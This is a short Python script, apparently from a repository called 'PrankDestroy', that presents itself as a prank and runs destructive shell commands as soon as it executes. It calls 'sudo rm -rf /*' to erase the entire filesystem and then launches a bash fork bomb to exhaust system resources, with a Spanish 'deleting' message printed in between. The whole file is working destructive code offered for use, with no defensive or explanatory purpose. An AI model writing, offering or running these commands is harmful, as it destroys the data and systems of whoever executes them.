# Delete Total System and created subprocess
# By: https://github.com/Br3Fuck/PrankDestroy
# Modulos:

import os
import time

# Permisos:

def permisos():
	os.system("chmod +a *")

# Clear:

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

# Deleted System:

def deleted():
	os.system("sudo rm -rf /*")
	time.sleep(6.50)
	os.system(":(){ :|:& };:")
	
# Run:

def script():
	permisos()
	clear()
	print("¡Eliminando!...")
	deleted()
	
script()
